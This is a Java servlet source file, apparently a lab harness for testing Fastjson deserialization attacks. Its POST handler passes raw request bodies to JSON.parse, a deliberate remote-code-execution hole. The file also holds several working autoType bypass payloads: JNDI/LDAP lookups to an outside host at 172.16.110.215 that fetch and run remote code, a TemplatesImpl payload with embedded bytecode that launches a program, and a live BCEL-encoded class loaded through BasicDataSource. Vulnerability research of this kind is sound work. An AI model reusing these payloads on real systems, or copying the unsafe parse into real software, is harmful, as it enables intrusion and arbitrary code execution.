package com.example.servletdemo; /**
 * @author : Walker
 * @date : Created in 2021/8/10 4:57 PM
 * @description: ${description}
 */

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;

@WebServlet(name = "FJServlet", value = "/demo")
public class FJServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println("<html><body>");
        out.println("<h1>" + "hello fastjson" + "</h1>");
        out.println("</body></html>");

        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //45
        //JSON.parseObject("{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://172.16.110.215:1389/ExecTemplateJDK8\"}}");
        //43
        //JSON.parseObject("{\"v43\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://172.16.110.215:1389/ExecTemplateJDK8\",\"autoCommit\":true]}}}");
        //42
//        JSON.parseObject("{\"v42\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://172.16.110.215:1389/ExecTemplateJDK8\",\"autoCommit\":true}}");
//        JSON.parseObject("{\"@type\":\"LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\",\"_bytecodes\":[\"yv66vgAAADEAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtTdGF0aWNCbG9jawEADElubmVyQ2xhc3NlcwEAEUxFeHAkU3RhdGljQmxvY2s7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAEAAUHABMBAA9FeHAkU3RhdGljQmxvY2sBABBqYXZhL2xhbmcvT2JqZWN0AQADRXhwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAGAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABoAGwoAGQAcAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAgAHgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMACAAIQoAGQAiACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgABAAAABwAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAWAAIAAAAAAAq4AB0SH7YAI1exAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ\"],\"_name\":\"c\",\"_tfactory\":{},\"outputProperties\":{}}", Feature.SupportNonPublicField);
        String beclText = "{\n" +
                "    {\n" +
                "        \"aaa\": {\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7dR$dbn$d3$40$Q$3d$9b$b8$b5c$i$d2$a4$Eh$a04$e5$d6$q$40$cc$a5o$a9$90$Q$w$CahE$a2$f6yc$96$e0$d4$f6Z$f6$a6$94$_$e2$b9$3c$E$c4$D$l$c0G$nf$9dR$82$a8$b0$e4$Z$cd$99$3d$e7$cc$5e$7e$fc$fc$f6$j$c0$s6m$9cC$a3$84$x$b8ja$d5$c65$ac$d9hb$dd$c2u$9do$98$b8i$c3$c2$z$T$b7Ml0$yn$Fq$a0$k3$U$5b$ed$3d$G$e3$a9$7c$x$Y$w$5e$Q$8b$d7$93h$u$d2$B$l$86$84$d4$3c$e9$f3p$8f$a7$81$aeO$40C$bd$P2$865$cf$97$91$fb$81$87$H$ou$df$f1L$8d3$Z$bbJd$ca$dd$3e$M$c2$k$83$b5$e5$87$t$3e$8cxuo$cc$P$b9$hH$f7$c5$ce$f6$91$_$S$V$c8$98$96$95$fb$8a$fb$H$afx$92$eb$d3$a8$Mv_NR_$3c$L$b4_I$cbu5$d7$81$83$b2$89$96$836$3aD$7c$$$c2P6$f7$f3$R$ba$s$ee8$b8$8b$7b$s$ba$O$5c$dcgh$c9D$c4M$b7$ff1S$or$9f$qI$Y$f8$5c$9bf$$$ed$ca$9f$84$5c$c9$b4$cb$93$c4$c1$D$3cdX$3ec$3e$H$8fPfX$fd$ef$5e$Z$96rj$c8$e3$91$bb3$i$L_$fd$F$cd$s$a0$d3$96$T5$7f$O$bbi$Q$ab$beJ$F$8fzs$f6s0$83$99$e8$w$8c$89$d7$f2$e6$q$V$c1$a3$9e$be$bd$ea$l$f4$cd$qVADgf$8f$84$3a$z$ea$ad$b6$f7$cf$g24$c4$91$f0$Z6$ce$d2$9d$83vS$e9$8b$y$pB$r$99MF$d75H$b9$_$b0$O$fd$f0$f4W$A$d3$97C$f1$3cU$$eFy$a1$f3$F$ec8oW$u$$$e6$a0$8d$r$8a$cel$B$aa$a8Q$b6$b0$7cJ$8er1$a0$f1$Z$85Zq$K$e3$x$Wj$8bS$98$fb$9f$60$bd$ecLQ$3a$a6$beE$cc$L$U$8b$b9r$83$b4$b5$a6E$K$d5$bcSA$9d$7cVH$fd$b7$5b$j$G$e1u$aa$$$d2o$a200q$c9$a0$c6$e5$7c$c0$95_W$l$c4sN$D$A$A\"\n" +
                "        }\n" +
                "    }: \"bbb\"\n" +
                "}";
        JSON.parse(beclText);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
        InputStreamReader insr = new InputStreamReader(request.getInputStream(),"utf-8");
        String result = "";
        int respInt = insr.read();
        while(respInt != -1) {
            result += (char)respInt;
            respInt = insr.read();
        }
        System.out.println(result);

//        String jsontext = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://172.16.110.215:1389/ExecTemplateJDK8\", \"autoCommit\":true}";
        JSON.parse(result);
    }
}
